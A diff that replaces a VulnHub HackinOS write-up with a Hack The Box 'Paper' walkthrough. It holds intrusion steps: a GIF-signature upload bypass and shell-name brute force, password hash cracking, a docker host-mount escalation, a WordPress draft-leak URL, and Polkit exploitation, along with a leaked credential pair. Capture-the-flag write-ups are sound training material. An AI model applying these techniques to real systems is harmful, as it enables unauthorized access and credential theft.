@@ -1,227 +1,174 @@
-# HackinOS: 1
+# Hack The Box: Paper
+Level: Easy  
+Date: 21/05/2022 19:43
+
 
 ## Recon & Enummeration
 
 Nmap shows us the following:
+
 ```
-Nmap scan report for 10.10.10.10
-Host is up (0.00057s latency).
-Not shown: 998 closed ports
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-21 11:54 EDT
+Nmap scan report for 10.10.11.143
+Host is up (0.022s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
 | ssh-hostkey: 
-|   2048 d9:c1:5c:20:9a:77:54:f8:a3:41:18:92:1b:1e:e5:35 (RSA)
-|   256 df:d4:f2:61:89:61:ac:e0:ee:3b:5d:07:0d:3f:0c:87 (ECDSA)
-|_  256 8b:e4:45:ab:af:c8:0e:7e:2a:e4:47:e7:52:f9:bc:71 (ED25519)
-8000/tcp open  http    Apache httpd 2.4.25 ((Debian))
-|_http-generator: WordPress 5.0.3
-|_http-open-proxy: Proxy might be redirecting requests
-| http-robots.txt: 2 disallowed entries 
-|_/upload.php /uploads
-|_http-server-header: Apache/2.4.25 (Debian)
-|_http-title: Blog &#8211; Just another WordPress site
+|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
+|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
+|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: HTTP Server Test Page powered by CentOS
+|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
+|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
+|_http-title: HTTP Server Test Page powered by CentOS
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+| tls-alpn: 
+|_  http/1.1
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
+| Subject Alternative Name: DNS:localhost.localdomain
+| Not valid before: 2021-07-03T08:52:34
+|_Not valid after:  2022-07-08T10:32:34
+|_ssl-date: TLS randomness does not represent time
 ```
 
-### Port 8000
-It's a plain wordpress website. While the Nmap scan is running, we try robots.txt:
+### Port 80
+Initally we encounter a plain website with a static start page of Apache running on CentOS.
 ```
-User-agent:*
-Disallow:/upload.php
-Disallow:/uploads
+HTTP/1.1 403 Forbidden
+Date: Sat, 21 May 2022 17:06:09 GMT
+Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+X-Backend-Server: office.paper
+Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
+ETag: "30c0b-5c5c7fdeec240"
+Accept-Ranges: bytes
+Content-Length: 199691
+Connection: close
+Content-Type: text/html; charset=UTF-8
 
 ```
 
-Also we come across a username: `Handsome_Container`
+Also we come across a domainname: `office.paper`. The webpage seems to be a reference to the TV show "[The Office](https://www.imdb.com/title/tt0386676/)":
+
+![e9d65ea1a34d9daf3fc60b8155c0ea0a.png](./_resources/e9d65ea1a34d9daf3fc60b8155c0ea0a-1.png)
+
+#### Wordpress
+We run WPScan on the site:
+
+```
+...
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entries:
+ |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+ |  - X-Powered-By: PHP/7.2.24
+ |  - X-Backend-Server: office.paper
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
+ |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
+
+[+] WordPress theme in use: construction-techup
+ | Location: http://office.paper/wp-content/themes/construction-techup/
+ | Last Updated: 2021-07-17T00:00:00.000Z
+ | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt
+ | [!] The version is out of date, the latest version is 1.4
+...
+
+
+```
+
+
+We know the site is running wordpress version **5.2.3**, which is vulnerable to [CVE-2019-17671](https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2). This vulnerability allows us to view private or draft posts as an unauthenticated user. We keep this in mind.
+
+#### Browsing the website
+Browsing the website we can find a post with a comment from user Nick on a [post](http://office.paper/index.php/2021/06/19/feeling-alone/#comments):
+
+
+The original posts states user `Prisonmike` is the only user of the blog:
+![980f1c1e0b041945dfd006b9962898be.png](./_resources/980f1c1e0b041945dfd006b9962898be-1.png)
+
+So we know we have to take a look at the drafts within the admin panel, another direct hint to the issue of this site.
+
 
 ## Intitial Foothold
 
-The page http://10.10.10.10:8000/upload.php gives us an LFI.
-Also, the source code is available via a link in the source code:
-https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php
+### The Wordpress Drafts
 
-We craft a reverse shell php file called `advancedshell.php` and start a listener on port 1234 to catch the reverse shell.
+To exploit CVE-2019-17671, we need to append`?static=1` to the base URL. So accessing the URL `http://office.paper/?static=1` we can access Michael's "hidden" notes:
 
-It doesn't work because the file type isn't an actual PNG or GIF file, according to its signature. Thus we modify the file signature as follows:
-```
-echo "47 49 46 38 37 61" | xxd -r -p - shell.php
-```
-which contains the file signature of a GIF file.
+![a5d7f262f0fd620d78f18c81f99cbf49.png](./_resources/a5d7f262f0fd620d78f18c81f99cbf49-1.png)
 
-We bruteforce the upload storage algrithm as follows:
-```
-for i in $(seq 1 100); do echo -n "shell.php"$i | md5sum | cut -d' ' -f 1| sed -rn 's|(.+)|http://10.10.10.10:8000/uploads/\1.php|p' | parallel 'echo {}; curl -s {}' ;done
-```
+We have obtained a new URL to add to our scope: `http://chat.office.paper/register/8qozr226AhkCHZdyY`
 
-Then we obtain a shell:
 
-```
-www-data@1afdd1f6b82c:/$ id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-```
+### Dwight's Chatbot
+This URL leads us to a registration page of Rocketchat:
+
+![d53c1b51748e454bdf4d9fed2b46015d.png](./_resources/d53c1b51748e454bdf4d9fed2b46015d-1.png)
+
+After registering we end up with access to a Channel called "General". In this chat we see Jim introduce Dwight's bot. If you watched the show, it's totally a Dwight thing to implement such a thing to be able to socialize less with his coworkers. The bot seems to have some sort wrapped SCP functionality as mentioned in point 3:
+![709b8ed9231846e177fcabf7f86cd3ce.png](./_resources/709b8ed9231846e177fcabf7f86cd3ce-1.png)
+
+We try to interact with the bot. We notice the list command has identical output to the `ls` command. Unfortunately we cannot inject OS commands easily, as that's detected by the bot:
+
+![4ca7bc3c1b7d1fa6d995530e16c1a417.png](./_resources/4ca7bc3c1b7d1fa6d995530e16c1a417-1.png)
+
+However, directory traversal is possible, which allows us to "list" the home directory:
+
+![52d9cdd42962c52494b1a91dd221298a.png](./_resources/52d9cdd42962c52494b1a91dd221298a-1.png)
+
+Apart from other player's exploits and files, we notice the `hubot` directory, which contains the bot's source code. It also contains a file called `.env` containing environment variables:
+
+![4956f14bafc2b59bdcf82a041eadfea9.png](./_resources/4956f14bafc2b59bdcf82a041eadfea9-1.png)
+
+We can see a pair of credentials for Rocketchat: `recylcops:Queenofblad3s!23`
+
+The actual source code can be found in the `../hubot/scripts` directory:
+
+![951685ab4b41846f97ce3f092f7d2d41.png](./_resources/951685ab4b41846f97ce3f092f7d2d41-1.png)
+
+From the source code of the `cmd.coffee` script, we learn that we can actually run OS commands as user dwight by interacting with the bot with the "cmd" command as follows:
+
+![98776abf9663880192a915d168b7e522.png](./_resources/98776abf9663880192a915d168b7e522-1.png)
+
+As the webshell is not optimal we manage to establish an SSH connection to the server and re-use the credentials successfully for user `dwight`:
+
+![aba51b111f943c0707518d829294fffc.png](./_resources/aba51b111f943c0707518d829294fffc-1.png)
 
 ## Privilege Escalation
 
-When we launch a simple Kernel CVE we miss the required binary to exploit:
-```
-Linux 4.10 < 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)
-[.] Checking environment ...
-[-] Could not find pkexec executable at /usr/bin/pkexec
-```
+Now we have obtained access through user *dwight*, we copy linpeas to the machine and execute the following command: `bash linpeas.sh | tee /tmp/peas.txt`
+
+We learn the system is vulnerable to CVE-2021-3560, AKA Polkit.
+
+![2e41578e012aa6b2fbf0fa9c8b4f79e3.png](./_resources/2e41578e012aa6b2fbf0fa9c8b4f79e3-1.png)
+
+Polkit seems to be readily available in exploitdb:
+We can copy the poc over to our working directory, and host it using Python's built-in webserver as follows:
+
+![d98de8a3cf1e53bf2ab4671d8769c9db.png](./_resources/d98de8a3cf1e53bf2ab4671d8769c9db-1.png)
 
 
-### Root@Container
-However, after further enumeration on the machine we discover we are within a docker container since the `/.dockerenv` paths and overlays mounted.
+On the victim machine we download the file, store it as `poc.sh` and modify the username and password to "pwn"
 
-Also, we can find a SUID binary GNU tail. Which let's us read the `/etc/shadow` file, containing the root password:
-
-```
-www-data@1afdd1f6b82c:/etc/mysql$ tail -n 900  /etc/shadow
-root:$6$qoj6/JJi$FQe/BZlfZV9VX8m0i25Suih5vi1S//OVNpd.PvEVYcL1bWSrF3XTVTF91n60yUuUMUcP65EgT8HfjLyjGHova/:17951:0:99999:7:::
-...
-```
+![ad3d38bb0916bfdfff47ccb7a4b464d3.png](./_resources/ad3d38bb0916bfdfff47ccb7a4b464d3-1.png)
 
 
+Then, we run the exploit `bash poc.sh`. 
 
-Which can be cracked with John, and turns out to be, "john", no kiddding:
-```
-kali@kali:~/ctf/boxes/vulnhub/hackinos$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
-Using default input encoding: UTF-8
-Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
-Cost 1 (iteration count) is 5000 for all loaded hashes
-Will run 3 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-john             (root)
-1g 0:00:00:01 DONE (2021-05-30 09:30) 0.5988g/s 4138p/s 4138c/s 4138C/s oblivion..better
-Use the "--show" option to display all of the cracked passwords reliably
-Session completed
-```
+![bd9b6f4f6483852e3cbfbef5a30fb6f3.png](./_resources/bd9b6f4f6483852e3cbfbef5a30fb6f3-1.png)
+Unfortunately it didn't insert the password directly after the first use. So we had to run the exploit once more. After which we could switch to our new user `pwn` and run sudo commands:
 
-We can access the flag at /root/flag.
-
-Now we have the local docker container root, we aim for the host.
-
-### Hummingbird@Host
-
-We also note a mysql installation on the machine. It isn't available on this container, as it connects to hostname `db` on port 3306 according to `wp-config.php` in the webroot.
-
-When we ping hostname `db` we find out it has IP 172.18.0.3. So we connect to it with the supplied user and password `wordpress:wordpress`
-
-
-`mysql -h 172.18.0.3 -u wordpress`
-
-
-And there we go:
-
-```
-+-----------------------+
-| Tables_in_wordpress   |
-+-----------------------+
-| host_ssh_cred         |
-| wp_commentmeta        |
-| wp_comments           |
-| wp_links              |
-| wp_options            |
-| wp_postmeta           |
-| wp_posts              |
-| wp_term_relationships |
-| wp_term_taxonomy      |
-| wp_termmeta           |
-| wp_terms              |
-| wp_usermeta           |
-| wp_users              |
-+-----------------------+
-13 rows in set (0.01 sec)
-
-MySQL [wordpress]> select * from host_ssh_cred;
-+-------------------+----------------------------------+
-| id                | pw                               |
-+-------------------+----------------------------------+
-| hummingbirdscyber | e10adc3949ba59abbe56e057f20f883e |
-+-------------------+----------------------------------+
-```
-
-This MD5 hash is easily crackable using John:
-```
-kali@kali:~/ctf/boxes/vulnhub/hackinos$ john hosthash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
-Using default input encoding: UTF-8
-Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
-Warning: no OpenMP support for this hash type, consider --fork=3
-Press 'q' or Ctrl-C to abort, almost any other key for status
-123456           (?)
-1g 0:00:00:00 DONE (2021-05-30 09:44) 25.00g/s 9600p/s 9600c/s 9600C/s 123456..michael1
-Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
-Session completed
-```
-
-Time to log in to SSH!
-
-```
-hummingbirdscyber@vulnvm:~$ id
-uid=1000(hummingbirdscyber) gid=1000(hummingbirdscyber) groups=1000(hummingbirdscyber),4(adm),24(cdrom),30(dip),46(plugdev),113(lpadmin),128(sambashare),129(docker)
-```
-
-### Root@Host
-
-For futher escalation we resort to Linpeas once again.
-
-Linpeas shows us 3 running docker containers. 2 we already explored (partially).
-```
-Running Docker Containers
-252fa8cb1646        ubuntu              "/bin/bash"              2 years ago         Up 19 hours                                brave_edison
-1afdd1f6b82c        wordpress:latest    "docker-entrypoint.s…"   2 years ago         Up 19 hours         0.0.0.0:8000->80/tcp   experimental_wordpress_1
-81a93420fd22        mysql:5.7           "docker-entrypoint.s…"   2 years ago         Up 19 hours         3306/tcp, 33060/tcp    experimental_db_1
-```
-
-We also find proFTPD running as root:
-```
-root      2879  0.0  0.2  13860  2500 ?        S    11:24   0:00  |   |   |   _ proftpd: (accepting connections)
-```
-
-which seems to be running in the 3rd docker container:
-
-```
-root      1281  0.0  1.2 233972 12056 ?        Sl   11:24   0:00 docker exec brave_edison /etc/init.d/ftp.sh
-```
-
-
-The fact that the we are able to run docker as root means we can run another ubuntu container and mount the host file system to it and read the flag:
-
-```
-hummingbirdscyber@vulnvm:~/Desktop$ docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
-root@c85d809c841d:/# cd /root
-root@c85d809c841d:~# ls
-flag
-root@c85d809c841d:~# head -n 1 flag 
-Congratulations!                    
-```
-
-As we mounted the host FS we can also read the `/etc/shadow` file:
-```
-hummingbirdscyber@vulnvm:~/Desktop$ docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
-root@50000283df34:/# head -n 1 /etc/shadow
-root:$6$1hmALcmw$RzOKJ7KmhRotfuySmfYZBqUPRl4MalQndhhBg2RCJWsSgqb7/fv4P7zTR0VI/zoAbStq/w51lwnnTgWvgMCNJ1:17955:0:99999:7:::
-```
-
-
-
-Which hash we can easily crack using John:
-```
-kali@kali:~/ctf/boxes/vulnhub/hackinos$ john hashes --wordlist=/usr/share/wordlists/rockyou.txt
-Warning: only loading hashes of type "sha512crypt", but also saw type "LM"
-Use the "--format=LM" option to force loading hashes of that type instead
-Using default input encoding: UTF-8
-Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
-Remaining 1 password hash
-Cost 1 (iteration count) is 5000 for all loaded hashes
-Will run 3 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-whiterabbit      (root)
-```
-
-Which allows us to login with `root:whiterabbit`
-```
-hummingbirdscyber@vulnvm:~/Desktop$ su 
-Password: 
-root@vulnvm:/home/hummingbirdscyber/Desktop# id
-uid=0(root) gid=0(root) groups=0(root)
-```
+![9ffc4e501c23dc08273f24e6c88a1cf1.png](./_resources/9ffc4e501c23dc08273f24e6c88a1cf1-1.png)
